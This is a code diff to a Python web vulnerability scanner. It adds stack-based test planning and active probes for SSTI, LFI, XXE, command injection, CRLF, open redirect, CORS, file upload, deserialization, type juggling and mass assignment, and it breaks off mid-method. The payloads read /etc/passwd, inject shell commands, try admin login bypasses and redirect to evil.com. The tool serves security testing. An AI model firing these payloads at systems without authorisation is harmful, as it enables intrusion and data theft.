@@ -401,7 +401,7 @@ class ActiveScanner:
         return f"sha256:{hashlib.sha256(data.encode()).hexdigest()[:16]}"
     
     def scan_target(self, target_url: str) -> ScanResult:
-        """Perform full scan on target."""
+        """Perform full scan on target with smart test selection."""
         timestamp = datetime.now().isoformat()
         
         # Reset tracking
@@ -419,44 +419,48 @@ class ActiveScanner:
             print("[!] Scanning known legitimate infrastructure may be against ToS")
         
         # Phase 1: Reconnaissance
+        if self.verbose:
+            print("\n[*] Phase 1: Reconnaissance & Tech Stack Detection...")
         tech_stack = self._detect_tech_stack(target_url)
         endpoints = self._discover_endpoints(target_url)
         
-        # Phase 2: Vulnerability Testing with Auto-Verification
         if self.verbose:
-            print("[*] Phase 2a: Capturing baselines for verification...")
+            print(f"    Server: {tech_stack.server or 'Unknown'}")
+            print(f"    Framework: {tech_stack.framework or 'Unknown'}")
+            print(f"    Language: {tech_stack.language or 'Unknown'}")
+            print(f"    Database: {tech_stack.database or 'Unknown'}")
+            print(f"    Endpoints found: {len(endpoints)}")
+        
+        # Phase 2: Smart Test Selection based on Tech Stack
+        test_plan = self._create_test_plan(tech_stack, endpoints)
+        
+        if self.verbose:
+            print(f"\n[*] Phase 2: Smart Test Selection (based on detected stack)")
+            print(f"    Priority tests: {', '.join(test_plan['priority'])}")
+            print(f"    Secondary tests: {', '.join(test_plan['secondary'])}")
+            print(f"    Skipped tests: {', '.join(test_plan['skip'])} (not relevant)")
+        
+        # Phase 3: Execute Tests in Priority Order
+        if self.verbose:
+            print("\n[*] Phase 3: Vulnerability Testing with Auto-Verification...")
         
         vulnerabilities = []
         raw_responses = []
         
-        # Test each endpoint
-        for endpoint in endpoints:
-            if self.verbose:
-                print(f"[*] Testing endpoint: {endpoint.url} ({endpoint.method})")
+        # Run priority tests first
+        for test_type in test_plan['priority']:
+            results = self._run_test_type(test_type, target_url, endpoints, tech_stack)
+            vulnerabilities.extend(results)
             
-            # NoSQL Injection tests
-            nosql_results = self._test_nosql_injection(endpoint)
-            vulnerabilities.extend(nosql_results)
-            
-            # SQL Injection tests
-            sqli_results = self._test_sql_injection(endpoint)
-            vulnerabilities.extend(sqli_results)
-            
-            # Auth bypass tests
-            auth_results = self._test_auth_bypass(endpoint)
-            vulnerabilities.extend(auth_results)
+            # Adaptive: if we find something, explore related tests
+            confirmed = [v for v in results if v.is_vulnerable]
+            if confirmed and self.verbose:
+                print(f"    [!] Found {len(confirmed)} {test_type} vulnerabilities - exploring related vectors...")
         
-        # JWT tests on base URL
-        jwt_results = self._test_jwt_vulnerabilities(target_url)
-        vulnerabilities.extend(jwt_results)
-        
-        # XSS tests
-        xss_results = self._test_xss(target_url, endpoints)
-        vulnerabilities.extend(xss_results)
-        
-        # SSRF tests
-        ssrf_results = self._test_ssrf(target_url, endpoints)
-        vulnerabilities.extend(ssrf_results)
+        # Run secondary tests
+        for test_type in test_plan['secondary']:
+            results = self._run_test_type(test_type, target_url, endpoints, tech_stack)
+            vulnerabilities.extend(results)
         
         # Print verification summary
         if self.verbose:
@@ -469,7 +473,6 @@ class ActiveScanner:
             
             if self._filtered_false_positives:
                 print(f"\n[*] Filtered False Positives:")
-                # Group by type
                 by_type = {}
                 for fp in self._filtered_false_positives:
                     t = fp["type"]
@@ -491,6 +494,206 @@ class ActiveScanner:
             vulnerabilities=vulnerabilities,
             raw_responses=raw_responses
         )
+    
+    def _create_test_plan(self, tech_stack: TechStack, endpoints: list[EndpointInfo]) -> dict:
+        """
+        Create smart test plan based on detected technology stack.
+        
+        Returns dict with:
+          - priority: tests to run first (high relevance)
+          - secondary: tests to run after (medium relevance)
+          - skip: tests not relevant for this stack
+        """
+        priority = []
+        secondary = []
+        skip = []
+        
+        lang = (tech_stack.language or "").lower()
+        fw = (tech_stack.framework or "").lower()
+        db = (tech_stack.database or "").lower()
+        server = (tech_stack.server or "").lower()
+        
+        # Check for GraphQL endpoint
+        has_graphql = any("/graphql" in e.url.lower() for e in endpoints)
+        
+        # Check for file upload endpoints
+        has_upload = any(
+            "upload" in e.url.lower() or 
+            "file" in e.url.lower() or
+            "image" in e.url.lower()
+            for e in endpoints
+        )
+        
+        # Check for URL parameters (potential SSRF, redirect targets)
+        has_url_params = any(
+            any(p.lower() in ["url", "redirect", "next", "return", "callback", "dest", "target", "link", "path"]
+                for p in e.parameters)
+            for e in endpoints
+        )
+        
+        # === Database-specific tests ===
+        if "mongo" in db:
+            priority.append("nosql")
+            skip.append("sqli")
+        elif db in ["mysql", "postgres", "postgresql", "mssql", "oracle", "sqlite"]:
+            priority.append("sqli")
+            skip.append("nosql")
+        else:
+            # Unknown DB - test both
+            secondary.append("sqli")
+            secondary.append("nosql")
+        
+        # === Language/Framework-specific tests ===
+        
+        # PHP
+        if "php" in lang or "laravel" in fw or "wordpress" in fw or "drupal" in fw:
+            priority.extend(["lfi", "rce", "type_juggling", "deserialization"])
+            if "wordpress" in fw:
+                priority.append("wordpress")  # WP-specific vulnerabilities
+        
+        # Python
+        elif "python" in lang or "django" in fw or "flask" in fw or "fastapi" in fw:
+            priority.extend(["ssti", "deserialization"])
+            if "django" in fw:
+                secondary.append("sqli")  # Django ORM bypass
+            if "flask" in fw or "jinja" in fw:
+                priority.append("ssti")  # Jinja2 SSTI
+        
+        # Node.js
+        elif "node" in lang or "express" in fw or "next" in fw:
+            priority.extend(["prototype_pollution", "nosql", "ssti"])
+            secondary.append("ssrf")
+        
+        # Java
+        elif "java" in lang or "spring" in fw or "struts" in fw or "tomcat" in server:
+            priority.extend(["deserialization", "xxe", "ssti"])
+            if "struts" in fw:
+                priority.append("rce")  # Struts RCE is common
+        
+        # .NET
+        elif "asp" in lang or ".net" in lang or "iis" in server:
+            priority.extend(["deserialization", "xxe", "sqli"])
+        
+        # Ruby
+        elif "ruby" in lang or "rails" in fw:
+            priority.extend(["ssti", "deserialization", "mass_assignment"])
+        
+        # === Universal tests (always relevant) ===
+        if "auth" not in [t for t in priority + secondary]:
+            priority.append("auth")  # Auth bypass
+        
+        if "xss" not in [t for t in priority + secondary]:
+            secondary.append("xss")
+        
+        if "jwt" not in [t for t in priority + secondary]:
+            secondary.append("jwt")
+        
+        # === Feature-specific tests ===
+        if has_graphql:
+            priority.append("graphql")
+        
+        if has_upload:
+            priority.append("file_upload")
+        
+        if has_url_params:
+            priority.extend(["ssrf", "open_redirect"])
+        else:
+            secondary.extend(["ssrf", "open_redirect"])
+        
+        # === Server-specific ===
+        if "nginx" in server:
+            secondary.append("crlf")  # Header injection
+        
+        if "apache" in server:
+            secondary.extend(["crlf", "lfi"])
+        
+        # === Additional tests ===
+        if "cors" not in [t for t in priority + secondary]:
+            secondary.append("cors")
+        
+        # Remove duplicates while preserving order
+        priority = list(dict.fromkeys(priority))
+        secondary = list(dict.fromkeys([t for t in secondary if t not in priority]))
+        
+        return {
+            "priority": priority,
+            "secondary": secondary,
+            "skip": skip
+        }
+    
+    def _run_test_type(self, test_type: str, target_url: str, 
+                       endpoints: list[EndpointInfo], tech_stack: TechStack) -> list:
+        """Execute a specific test type and return results."""
+        results = []
+        
+        if self.verbose:
+            print(f"\n[*] Testing: {test_type.upper()}")
+        
+        if test_type == "nosql":
+            for endpoint in endpoints:
+                results.extend(self._test_nosql_injection(endpoint))
+        
+        elif test_type == "sqli":
+            for endpoint in endpoints:
+                results.extend(self._test_sql_injection(endpoint))
+        
+        elif test_type == "auth":
+            for endpoint in endpoints:
+                results.extend(self._test_auth_bypass(endpoint))
+        
+        elif test_type == "jwt":
+            results.extend(self._test_jwt_vulnerabilities(target_url))
+        
+        elif test_type == "xss":
+            results.extend(self._test_xss(target_url, endpoints))
+        
+        elif test_type == "ssrf":
+            results.extend(self._test_ssrf(target_url, endpoints))
+        
+        elif test_type == "ssti":
+            results.extend(self._test_ssti(target_url, endpoints, tech_stack))
+        
+        elif test_type == "lfi":
+            results.extend(self._test_lfi(target_url, endpoints))
+        
+        elif test_type == "xxe":
+            results.extend(self._test_xxe(target_url, endpoints))
+        
+        elif test_type == "rce":
+            results.extend(self._test_rce(target_url, endpoints))
+        
+        elif test_type == "crlf":
+            results.extend(self._test_crlf(target_url, endpoints))
+        
+        elif test_type == "open_redirect":
+            results.extend(self._test_open_redirect(target_url, endpoints))
+        
+        elif test_type == "cors":
+            results.extend(self._test_cors(target_url))
+        
+        elif test_type == "graphql":
+            results.extend(self._test_graphql(target_url, endpoints))
+        
+        elif test_type == "file_upload":
+            results.extend(self._test_file_upload(target_url, endpoints))
+        
+        elif test_type == "prototype_pollution":
+            results.extend(self._test_prototype_pollution(target_url, endpoints))
+        
+        elif test_type == "deserialization":
+            results.extend(self._test_deserialization(target_url, endpoints, tech_stack))
+        
+        elif test_type == "type_juggling":
+            results.extend(self._test_type_juggling(target_url, endpoints))
+        
+        elif test_type == "mass_assignment":
+            results.extend(self._test_mass_assignment(target_url, endpoints))
+        
+        else:
+            if self.verbose:
+                print(f"    [!] Test type '{test_type}' not implemented yet")
+        
+        return results
     
     def _detect_tech_stack(self, base_url: str) -> TechStack:
         """Detect technology stack from headers and responses."""
@@ -1141,4 +1344,694 @@ class ActiveScanner:
                     # Skip on timeout/connection errors
                     continue
                         
+        return results
+    
+    # ==================== NEW TEST METHODS ====================
+    
+    def _test_ssti(self, base_url: str, endpoints: list[EndpointInfo], 
+                   tech_stack: TechStack) -> list[VulnTestResult]:
+        """Test for Server-Side Template Injection."""
+        results = []
+        
+        # Framework-specific payloads
+        payloads_by_framework = {
+            "jinja2": [
+                ("{{7*7}}", "49"),
+                ("{{config}}", "SECRET_KEY"),
+                ("{{self.__class__.__mro__}}", "__class__"),
+            ],
+            "twig": [
+                ("{{7*7}}", "49"),
+                ("{{_self.env.getFilter}}", "getFilter"),
+            ],
+            "freemarker": [
+                ("${7*7}", "49"),
+                ("<#assign x=7*7>${x}", "49"),
+            ],
+            "velocity": [
+                ("#set($x=7*7)$x", "49"),
+            ],
+            "erb": [
+                ("<%= 7*7 %>", "49"),
+            ],
+            "generic": [
+                ("{{7*7}}", "49"),
+                ("${7*7}", "49"),
+                ("<%=7*7%>", "49"),
+                ("#{7*7}", "49"),
+                ("${{7*7}}", "49"),
+            ]
+        }
+        
+        # Select payloads based on detected framework
+        fw = (tech_stack.framework or "").lower()
+        lang = (tech_stack.language or "").lower()
+        
+        if "flask" in fw or "jinja" in fw or "python" in lang:
+            test_payloads = payloads_by_framework["jinja2"] + payloads_by_framework["generic"]
+        elif "php" in lang or "twig" in fw:
+            test_payloads = payloads_by_framework["twig"] + payloads_by_framework["generic"]
+        elif "java" in lang:
+            test_payloads = payloads_by_framework["freemarker"] + payloads_by_framework["velocity"] + payloads_by_framework["generic"]
+        elif "ruby" in lang:
+            test_payloads = payloads_by_framework["erb"] + payloads_by_framework["generic"]
+        else:
+            test_payloads = payloads_by_framework["generic"]
+        
+        # Test parameters that might be rendered in templates
+        test_params = ["name", "title", "message", "template", "content", "text", "q", "search"]
+        
+        for param in test_params:
+            for payload, expected in test_payloads:
+                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
+                resp = self._make_request("GET", test_url)
+                
+                if expected in resp.body:
+                    self._log(f"[+] SSTI detected with payload: {payload}")
+                    results.append(VulnTestResult(
+                        vuln_type="Server-Side Template Injection (SSTI)",
+                        payload=payload,
+                        target_url=test_url,
+                        request_data=test_url,
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.95,
+                        evidence=f"Template expression evaluated: {payload} -> {expected}",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
+                    return results  # Found confirmed
+        
+        # Test POST endpoints
+        for endpoint in endpoints:
+            if endpoint.method == "POST":
+                for payload, expected in test_payloads[:3]:  # Limit payloads
+                    data = {p: payload for p in endpoint.parameters[:2]} if endpoint.parameters else {"input": payload}
+                    resp = self._make_request("POST", endpoint.url, json_data=data)
+                    
+                    if expected in resp.body:
+                        results.append(VulnTestResult(
+                            vuln_type="Server-Side Template Injection (SSTI)",
+                            payload=payload,
+                            target_url=endpoint.url,
+                            request_data=json.dumps(data),
+                            response=resp,
+                            is_vulnerable=True,
+                            confidence=0.95,
+                            evidence=f"Template expression evaluated in POST body",
+                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                        ))
+                        return results
+        
+        return results
+    
+    def _test_lfi(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for Local File Inclusion / Path Traversal."""
+        results = []
+        
+        payloads = [
+            ("../../../etc/passwd", "root:"),
+            ("....//....//....//etc/passwd", "root:"),
+            ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
+            ("..\\..\\..\\windows\\win.ini", "[fonts]"),
+            ("....\\\\....\\\\windows\\\\win.ini", "[fonts]"),
+            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),  # Base64 of "<?php"
+            ("file:///etc/passwd", "root:"),
+        ]
+        
+        # Common parameters for file inclusion
+        file_params = ["file", "page", "path", "include", "doc", "document", "template", "view", "load", "read"]
+        
+        for param in file_params:
+            for payload, expected in payloads:
+                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
+                resp = self._make_request("GET", test_url)
+                
+                if expected in resp.body:
+                    self._log(f"[+] LFI detected: {payload}")
+                    results.append(VulnTestResult(
+                        vuln_type="Local File Inclusion (LFI)",
+                        payload=payload,
+                        target_url=test_url,
+                        request_data=test_url,
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.95,
+                        evidence=f"File contents retrieved: {expected[:50]}...",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
+                    return results
+        
+        return results
+    
+    def _test_xxe(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for XML External Entity Injection."""
+        results = []
+        
+        xxe_payloads = [
+            # File read
+            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>''',
+            # Windows file read
+            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>''',
+            # SSRF via XXE
+            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><data>&xxe;</data>''',
+        ]
+        
+        # Look for XML endpoints
+        xml_endpoints = [e for e in endpoints if "xml" in e.content_type.lower() or "xml" in e.url.lower()]
+        
+        # Also try common XML paths
+        xml_paths = ["/api/import", "/upload", "/parse", "/xml", "/data"]
+        
+        for path in xml_paths:
+            url = f"{base_url}{path}"
+            for payload in xxe_payloads:
+                resp = self._make_request("POST", url, 
+                    data=payload.encode(),
+                    headers={"Content-Type": "application/xml"}
+                )
+                
+                if resp.status_code == 200:
+                    if "root:" in resp.body or "[fonts]" in resp.body:
+                        results.append(VulnTestResult(
+                            vuln_type="XML External Entity (XXE)",
+                            payload=payload[:100] + "...",
+                            target_url=url,
+                            request_data=payload,
+                            response=resp,
+                            is_vulnerable=True,
+                            confidence=0.95,
+                            evidence="File contents retrieved via XXE",
+                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                        ))
+                        return results
+        
+        return results
+    
+    def _test_rce(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for Remote Code Execution / Command Injection."""
+        results = []
+        
+        # Time-based detection payloads
+        payloads = [
+            ("; sleep 5", 5000),  # Unix
+            ("| sleep 5", 5000),
+            ("& ping -c 5 127.0.0.1 &", 5000),
+            ("`sleep 5`", 5000),
+            ("$(sleep 5)", 5000),
+            ("\nping -c 5 127.0.0.1\n", 5000),
+            # Windows
+            ("& ping -n 5 127.0.0.1 &", 5000),
+            ("| timeout 5", 5000),
+        ]
+        
+        # Output-based detection
+        output_payloads = [
+            ("; id", "uid="),
+            ("| id", "uid="),
+            ("; whoami", "www-data"),
+            ("| cat /etc/passwd", "root:"),
+        ]
+        
+        # Common injection parameters
+        cmd_params = ["cmd", "exec", "command", "ping", "query", "host", "ip", "process", "run"]
+        
+        for param in cmd_params:
+            # Time-based tests
+            for payload, expected_delay in payloads[:4]:  # Limit to avoid timeout
+                test_url = f"{base_url}/?{param}=127.0.0.1{urllib.parse.quote(payload)}"
+                resp = self._make_request("GET", test_url)
+                
+                if resp.elapsed_ms >= expected_delay:
+                    self._log(f"[+] Potential RCE via time delay: {payload}")
+                    results.append(VulnTestResult(
+                        vuln_type="Remote Code Execution (RCE)",
+                        payload=payload,
+                        target_url=test_url,
+                        request_data=test_url,
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.80,
+                        evidence=f"Time-based RCE detected: {resp.elapsed_ms}ms delay",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.elapsed_ms}")
+                    ))
+                    return results
+            
+            # Output-based tests
+            for payload, expected in output_payloads:
+                test_url = f"{base_url}/?{param}=test{urllib.parse.quote(payload)}"
+                resp = self._make_request("GET", test_url)
+                
+                if expected in resp.body:
+                    results.append(VulnTestResult(
+                        vuln_type="Remote Code Execution (RCE)",
+                        payload=payload,
+                        target_url=test_url,
+                        request_data=test_url,
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.95,
+                        evidence=f"Command output in response: {expected}",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
+                    return results
+        
+        return results
+    
+    def _test_crlf(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for CRLF Injection / HTTP Response Splitting."""
+        results = []
+        
+        payloads = [
+            "%0d%0aX-Injected: true",
+            "%0d%0aSet-Cookie: injected=true",
+            "\r\nX-Injected: true",
+            "%E5%98%8A%E5%98%8DX-Injected: true",  # Unicode CRLF
+        ]
+        
+        redirect_params = ["url", "redirect", "next", "return", "dest", "goto"]
+        
+        for param in redirect_params:
+            for payload in payloads:
+                test_url = f"{base_url}/?{param}=http://example.com{payload}"
+                resp = self._make_request("GET", test_url)
+                
+                # Check if our header was injected
+                if "X-Injected" in str(resp.headers) or "injected=true" in str(resp.headers):
+                    results.append(VulnTestResult(
+                        vuln_type="CRLF Injection",
+                        payload=payload,
+                        target_url=test_url,
+                        request_data=test_url,
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.90,
+                        evidence="Header injection successful",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{str(resp.headers)[:500]}")
+                    ))
+                    return results
+        
+        return results
+    
+    def _test_open_redirect(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for Open Redirect vulnerabilities."""
+        results = []
+        
+        payloads = [
+            "https://evil.com",
+            "//evil.com",
+            "/\\evil.com",
+            "https:evil.com",
+            "////evil.com",
+            "https://evil.com%2f%2f",
+            "https://evil.com?@legitimate.com",
+        ]
+        
+        redirect_params = ["url", "redirect", "next", "return", "dest", "goto", "continue", "target", "rurl", "redirect_uri"]
+        
+        for param in redirect_params:
+            for payload in payloads:
+                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
+                resp = self._make_request("GET", test_url)
+                
+                # Check for redirect to evil domain
+                location = resp.headers.get("Location", resp.headers.get("location", ""))
+                if "evil.com" in location:
+                    results.append(VulnTestResult(
+                        vuln_type="Open Redirect",
+                        payload=payload,
+                        target_url=test_url,
+                        request_data=test_url,
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.90,
+                        evidence=f"Redirect to external domain: {location}",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{location}")
+                    ))
+                    return results
+        
+        return results
+    
+    def _test_cors(self, base_url: str) -> list[VulnTestResult]:
+        """Test for CORS misconfigurations."""
+        results = []
+        
+        test_origins = [
+            "https://evil.com",
+            "null",
+            f"{base_url}.evil.com",  # Subdomain
+            base_url.replace("https://", "https://evil."),  # Prefix injection
+        ]
+        
+        for origin in test_origins:
+            resp = self._make_request("GET", base_url, headers={"Origin": origin})
+            
+            acao = resp.headers.get("Access-Control-Allow-Origin", "")
+            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+            
+            if acao == origin or acao == "*":
+                is_critical = acac.lower() == "true" and acao != "*"
+                confidence = 0.95 if is_critical else 0.70
+                severity = "CRITICAL" if is_critical else "MEDIUM"
+                
+                results.append(VulnTestResult(
+                    vuln_type=f"CORS Misconfiguration ({severity})",
+                    payload=origin,
+                    target_url=base_url,
+                    request_data=f"Origin: {origin}",
+                    response=resp,
+                    is_vulnerable=is_critical,
+                    confidence=confidence,
+                    evidence=f"ACAO: {acao}, ACAC: {acac}",
+                    evidence_hash=self._hash_evidence(f"{acao}:{acac}")
+                ))
+                
+                if is_critical:
+                    return results
+        
+        return results
+    
+    def _test_graphql(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for GraphQL vulnerabilities."""
+        results = []
+        
+        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
+        
+        # Introspection query
+        introspection = {
+            "query": "{__schema{types{name,fields{name}}}}"
+        }
+        
+        # Batch query (DoS potential)
+        batch_query = [
+            {"query": "{__typename}"},
+            {"query": "{__typename}"},
+            {"query": "{__typename}"},
+        ]
+        
+        for path in graphql_paths:
+            url = f"{base_url}{path}"
+            
+            # Test introspection
+            resp = self._make_request("POST", url, json_data=introspection)
+            
+            if "__schema" in resp.body or "types" in resp.body:
+                self._log(f"[+] GraphQL introspection enabled at {url}")
+                results.append(VulnTestResult(
+                    vuln_type="GraphQL Introspection Enabled",
+                    payload=introspection["query"],
+                    target_url=url,
+                    request_data=json.dumps(introspection),
+                    response=resp,
+                    is_vulnerable=True,
+                    confidence=0.90,
+                    evidence="Schema information disclosed via introspection",
+                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                ))
+            
+            # Test batch queries
+            resp = self._make_request("POST", url, json_data=batch_query)
+            
+            if resp.status_code == 200 and resp.body.count("__typename") >= 3:
+                results.append(VulnTestResult(
+                    vuln_type="GraphQL Batching Enabled (DoS risk)",
+                    payload=str(batch_query),
+                    target_url=url,
+                    request_data=json.dumps(batch_query),
+                    response=resp,
+                    is_vulnerable=False,  # Info only
+                    confidence=0.70,
+                    evidence="Multiple queries accepted in single request",
+                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                ))
+        
+        return results
+    
+    def _test_file_upload(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for insecure file upload."""
+        results = []
+        
+        # Find upload endpoints
+        upload_endpoints = [e for e in endpoints if any(
+            x in e.url.lower() for x in ["upload", "file", "image", "avatar", "import"]
+        )]
+        
+        if not upload_endpoints:
+            upload_endpoints = [EndpointInfo(url=f"{base_url}/upload", method="POST")]
+        
+        # Dangerous extensions to test
+        payloads = [
+            ("test.php", "<?php echo 'RCE'; ?>", "application/x-php"),
+            ("test.php.jpg", "<?php echo 'RCE'; ?>", "image/jpeg"),
+            ("test.phtml", "<?php echo 'RCE'; ?>", "text/html"),
+            ("test.asp", "<% Response.Write(\"RCE\") %>", "application/octet-stream"),
+            ("test.jsp", "<%= \"RCE\" %>", "application/octet-stream"),
+            ("test.svg", "<svg onload=alert(1)>", "image/svg+xml"),
+        ]
+        
+        for endpoint in upload_endpoints:
+            for filename, content, content_type in payloads:
+                # Build multipart form data (simplified)
+                boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+                body = f"""--{boundary}\r
+Content-Disposition: form-data; name="file"; filename="{filename}"\r
+Content-Type: {content_type}\r
+\r
+{content}\r
+--{boundary}--"""
+                
+                resp = self._make_request("POST", endpoint.url,
+                    data=body.encode(),
+                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
+                )
+                
+                # Check if file was accepted
+                if resp.status_code in [200, 201] and "error" not in resp.body.lower():
+                    # Try to extract uploaded file path
+                    try:
+                        data = json.loads(resp.body)
+                        file_path = data.get("path") or data.get("url") or data.get("file")
+                        evidence = f"File uploaded: {file_path}" if file_path else "File upload accepted"
+                    except:
+                        evidence = "File upload accepted without extension validation"
+                    
+                    results.append(VulnTestResult(
+                        vuln_type="Insecure File Upload",
+                        payload=filename,
+                        target_url=endpoint.url,
+                        request_data=f"Filename: {filename}, Content-Type: {content_type}",
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.80,
+                        evidence=evidence,
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
+                    return results
+        
+        return results
+    
+    def _test_prototype_pollution(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for Prototype Pollution (Node.js)."""
+        results = []
+        
+        payloads = [
+            {"__proto__": {"polluted": True}},
+            {"constructor": {"prototype": {"polluted": True}}},
+            {"__proto__.polluted": True},
+        ]
+        
+        for endpoint in endpoints:
+            if endpoint.method == "POST":
+                for payload in payloads:
+                    resp = self._make_request("POST", endpoint.url, json_data=payload)
+                    
+                    # Check if prototype was polluted (response might include polluted property)
+                    if "polluted" in resp.body and "true" in resp.body.lower():
+                        results.append(VulnTestResult(
+                            vuln_type="Prototype Pollution",
+                            payload=json.dumps(payload),
+                            target_url=endpoint.url,
+                            request_data=json.dumps(payload),
+                            response=resp,
+                            is_vulnerable=True,
+                            confidence=0.85,
+                            evidence="Prototype property reflected in response",
+                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                        ))
+                        return results
+        
+        return results
+    
+    def _test_deserialization(self, base_url: str, endpoints: list[EndpointInfo], 
+                              tech_stack: TechStack) -> list[VulnTestResult]:
+        """Test for insecure deserialization."""
+        results = []
+        
+        lang = (tech_stack.language or "").lower()
+        
+        # Language-specific payloads
+        if "php" in lang:
+            # PHP serialize
+            payloads = [
+                ('O:8:"stdClass":1:{s:4:"test";s:3:"rce";}', "application/x-php-serialized"),
+            ]
+        elif "python" in lang:
+            # Python pickle (base64)
+            payloads = [
+                ("gASVEgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFcHJpbnSUhZRSlC4=", "application/octet-stream"),
+            ]
+        elif "java" in lang:
+            # Java serialization magic bytes (aced0005)
+            payloads = [
+                ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "application/x-java-serialized-object"),
+            ]
+        else:
+            # Generic test
+            payloads = [
+                ('{"$type": "System.Windows.Forms.BindingSource"}', "application/json"),  # .NET
+            ]
+        
+        # Look for potential deserialization endpoints
+        deser_params = ["data", "object", "state", "session", "token", "payload"]
+        
+        for param in deser_params:
+            for payload, content_type in payloads:
+                resp = self._make_request("POST", f"{base_url}/api/{param}",
+                    data=payload.encode(),
+                    headers={"Content-Type": content_type}
+                )
+                
+                # Check for deserialization errors (indicates parsing)
+                if any(x in resp.body.lower() for x in ["unserialize", "unpickle", "objectinputstream", "deserialize"]):
+                    results.append(VulnTestResult(
+                        vuln_type="Insecure Deserialization",
+                        payload=payload[:100],
+                        target_url=f"{base_url}/api/{param}",
+                        request_data=payload,
+                        response=resp,
+                        is_vulnerable=False,  # Needs manual verification
+                        confidence=0.60,
+                        evidence="Deserialization error suggests vulnerable endpoint",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
+        
+        return results
+    
+    def _test_type_juggling(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for PHP type juggling vulnerabilities."""
+        results = []
+        
+        # Magic hashes that equal "0" when compared loosely
+        magic_hashes = [
+            "0e462097431906509019562988736854",  # MD5 of "240610708"
+            "0e215962017",  # MD5 of "QNKCDZO"
+        ]
+        
+        # Type confusion payloads
+        type_payloads = [
+            ({"password": True}, "boolean true comparison"),
+            ({"password": 0}, "zero comparison"),
+            ({"password": []}, "empty array comparison"),
+            ({"password": {"password": True}}, "nested object"),
+        ]
+        
+        login_endpoints = [e for e in endpoints if any(
+            x in e.url.lower() for x in ["login", "auth", "signin"]
+        )]
+        
+        for endpoint in login_endpoints:
+            # Test magic hashes
+            for magic in magic_hashes:
+                data = {"username": "admin", "password": magic}
+                resp = self._make_request("POST", endpoint.url, json_data=data)
+                
+                if resp.status_code == 200 and any(x in resp.body.lower() for x in ["token", "success", "welcome"]):
+                    results.append(VulnTestResult(
+                        vuln_type="PHP Type Juggling (Magic Hash)",
+                        payload=magic,
+                        target_url=endpoint.url,
+                        request_data=json.dumps(data),
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.85,
+                        evidence="Authentication bypassed with magic hash",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
+                    return results
+            
+            # Test type confusion
+            for payload, desc in type_payloads:
+                data = {"username": "admin", **payload}
+                resp = self._make_request("POST", endpoint.url, json_data=data)
+                
+                if resp.status_code == 200 and any(x in resp.body.lower() for x in ["token", "success"]):
+                    results.append(VulnTestResult(
+                        vuln_type=f"PHP Type Juggling ({desc})",
+                        payload=json.dumps(payload),
+                        target_url=endpoint.url,
+                        request_data=json.dumps(data),
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=0.85,
+                        evidence=f"Authentication bypassed via {desc}",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
+                    return results
+        
+        return results
+    
+    def _test_mass_assignment(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for mass assignment vulnerabilities."""
+        results = []
+        
+        # Dangerous parameters to inject
+        dangerous_params = [
+            ("isAdmin", True),
+            ("admin", True),
+            ("role", "admin"),
+            ("is_admin", True),
+            ("user_type", "admin"),
+            ("privileges", ["admin"]),
+            ("verified", True),
+            ("email_verified", True),
+            ("is_superuser", True),
+        ]
+        
+        # Test on registration/update endpoints
